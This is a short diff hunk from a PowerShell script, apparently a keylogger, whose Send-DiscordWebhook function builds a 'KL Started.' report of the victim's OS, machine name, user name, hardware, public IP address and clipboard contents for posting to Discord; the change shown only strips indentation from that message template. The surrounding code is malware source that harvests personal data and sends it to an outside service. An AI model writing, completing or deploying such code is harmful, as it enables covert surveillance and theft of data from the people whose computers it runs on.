@@ -49,21 +49,21 @@ function Send-DiscordWebhook {
     $clipboardContent = Get-ClipboardContent
 
     $content = @"
-    **KL Started.**
+**KL Started.**
 
-    **PC Information**
-    `OS:` $($systemInfo['OS'])
-    `Architecture:` $($systemInfo['Architecture'])
-    `Machine Name:` $($systemInfo['MachineName'])
-    `User Name:` $($systemInfo['UserName'])
-    `CPU:` $($systemInfo['CPU'])
-    `RAM:` $($systemInfo['RAM']) GB
+**PC Information**
+`OS:` $($systemInfo['OS'])
+`Architecture:` $($systemInfo['Architecture'])
+`Machine Name:` $($systemInfo['MachineName'])
+`User Name:` $($systemInfo['UserName'])
+`CPU:` $($systemInfo['CPU'])
+`RAM:` $($systemInfo['RAM']) GB
 
-    **Public IP:** $publicIP
+**Public IP:** $publicIP
 
-    **Clipboard Content:**
-    $clipboardContent
-    "@
+**Clipboard Content:**
+$clipboardContent
+"@
 
     $jsonsys = @{
         "username" = "$env:COMPUTERNAME"
